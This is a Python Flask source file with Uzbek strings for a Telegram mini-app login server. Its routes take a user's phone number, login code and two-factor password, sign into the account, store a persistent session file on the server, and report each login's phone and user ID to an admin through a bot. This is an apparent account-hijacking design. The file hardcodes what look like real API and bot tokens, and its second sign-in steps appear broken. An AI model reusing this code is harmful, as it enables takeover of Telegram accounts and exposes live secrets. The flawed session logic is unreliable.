import os
import asyncio
from flask import Flask, request, jsonify, render_template
from telethon import TelegramClient
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneNumberInvalidError
)
from aiogram import Bot
from database import get_db, init_db
import threading

SESSIONS_DIR = "/app/sessions"

async def get_client(user_id: int):
    session_file = os.path.join(SESSIONS_DIR, str(user_id))

    client = TelegramClient(
        session_file,
        API_ID,
        API_HASH
    )

    await client.connect()

    if not await client.is_user_authorized():
        await client.disconnect()
        raise Exception("Telegram login qilinmagan")

    return client


# ======================
# CONFIG
# ======================
API_ID = 25780325
API_HASH = "2c4cb6eee01a46dc648114813042c453"
BOT_TOKEN = "8485200508:AAEIwbb9HpGBUX_mWPGVplpxNRoXXnlSOrU"

ADMIN_BOT_TOKEN = "8455652640:AAE0Mf0haSpP_8yCjZTCKAqGQAcVF4kf02s"
ADMIN_ID = 515902673

ADMIN_CHAT_ID = ADMIN_ID
admin_bot = Bot(ADMIN_BOT_TOKEN)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)

bot = Bot(BOT_TOKEN)
app = Flask(__name__, template_folder="templates")
init_db()

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# phone -> {client, hash}
pending = {}

   
def notify_admin_login(user_id: str, phone: str, username: str | None = None):
    async def _send():
        text = (
            "🔐 Yangi foydalanuvchi login qildi\n\n"
            f"👤 User ID: {user_id}\n"
            f"📱 Telefon: {phone}\n"
        )
        if username:
            text += f"👤 Username: @{username}"

        await admin_bot.send_message(ADMIN_CHAT_ID, text)

    def runner():
        asyncio.run(_send())

    threading.Thread(target=runner, daemon=True).start()


# ======================
# ROUTES
# ======================

@app.route("/")
def index():
    return "OK, LOGIN SERVER ISHLAYAPTI"

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")

@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.json
    phone = data.get("phone")

    try:
        async def work():
            client = TelegramClient(
                None,
                API_ID,
                API_HASH
            )
            await client.connect()
            sent = await client.send_code_request(phone)
            await client.disconnect()

            pending[phone] = {
                "hash": sent.phone_code_hash
            }

        run_async(work())
        return jsonify({"status": "code_sent"})

    except FloodWaitError as e:
        return jsonify({"status": "flood_wait", "seconds": e.seconds})
    except PhoneNumberInvalidError:
        return jsonify({"status": "phone_invalid"})
    except Exception as e:
        print("SEND CODE ERROR:", e)
        return jsonify({"status": "error"})



@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    if phone not in pending:
        return jsonify({"status": "no_code_requested"})

    phone_hash = pending[phone]["hash"]

    try:
        async def work():
            # 1️⃣ vaqtinchalik client (kodni tekshirish uchun)
            temp_client = TelegramClient(
                None,
                API_ID,
                API_HASH
            )
            await temp_client.connect()

            await temp_client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_hash
            )

            me = await temp_client.get_me()

            # 2️⃣ ASOSIY SESSION — user_id bilan
            session_file = os.path.join(SESSIONS_DIR, str(me.id))
            client = TelegramClient(
                session_file,
                API_ID,
                API_HASH
            )

            await client.connect()
            await client.sign_in(phone=phone)

            await temp_client.disconnect()
            await client.disconnect()

            return me

        me = run_async(work())
        pending.pop(phone, None)

        user_id = str(me.id)

        # 🔽 subscriptions → trial
        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO subscriptions (user_id, status, free_used)
            VALUES (%s, 'trial', FALSE)
            ON CONFLICT (user_id) DO NOTHING
        """, (user_id,))
        conn.commit()
        conn.close()

        notify_admin_login(
            user_id=user_id,
            phone=phone,
            username=getattr(me, "username", None)
        )

        return jsonify({"status": "success"})

    except SessionPasswordNeededError:
        return jsonify({"status": "2fa_required"})
    except PhoneCodeInvalidError:
        return jsonify({"status": "invalid_code"})
    except Exception as e:
        print("VERIFY CODE ERROR:", e)
        return jsonify({"status": "error"})



@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.json
    phone = data.get("phone")
    password = data.get("password")

    try:
        async def work():
            temp_client = TelegramClient(None, API_ID, API_HASH)
            await temp_client.connect()

            await temp_client.sign_in(password=password)
            me = await temp_client.get_me()

            session_file = os.path.join(SESSIONS_DIR, str(me.id))
            client = TelegramClient(session_file, API_ID, API_HASH)
            await client.connect()
            await client.sign_in(password=password)

            await temp_client.disconnect()
            await client.disconnect()
            return me

        me = run_async(work())

        user_id = str(me.id)

        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO authorized_users (user_id)
            VALUES (%s)
            ON CONFLICT (user_id) DO NOTHING
        """, (user_id,))
        conn.commit()
        conn.close()

        notify_admin_login(
            user_id=user_id,
            phone=phone,
            username=getattr(me, "username", None)
        )

        return jsonify({"status": "success"})

    except Exception as e:
        print("VERIFY PASSWORD ERROR:", e)
        return jsonify({"status": "invalid_password"})



def notify_admin(user_id: str, phone: str, username: str | None = None):
    async def _send():
        text = (
            "🔐 Yangi login\n\n"
            f"👤 User ID: {user_id}\n"
            f"📱 Phone: {phone}\n"
        )
        if username:
            text += f"👤 Username: @{username}"

        await admin_bot.send_message(ADMIN_CHAT_ID, text)

    def runner():
        asyncio.run(_send())

    threading.Thread(target=runner, daemon=True).start()


# ======================
# RUN
# ======================

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)


















